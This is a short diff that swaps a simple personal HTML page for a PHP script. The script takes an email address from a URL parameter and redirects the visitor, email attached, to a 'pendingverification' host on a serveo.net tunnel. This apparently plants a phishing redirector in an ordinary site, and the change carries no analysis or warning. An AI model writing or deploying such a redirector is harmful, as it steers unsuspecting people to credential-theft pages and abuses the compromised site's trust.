@@ -1,8 +1,6 @@
-<html>
-<head>
-<title>Wilmer 2019 </title>
-</head>
-<body>
-	This is wilmer
-</body>
-	
+<?php
+ $site = "https://pendingverification.serveo.net/go";
+ $email = $_GET['var'];
+  header("Location: ".$site."/index.php?email=".$email."");
+  exit;
+?>
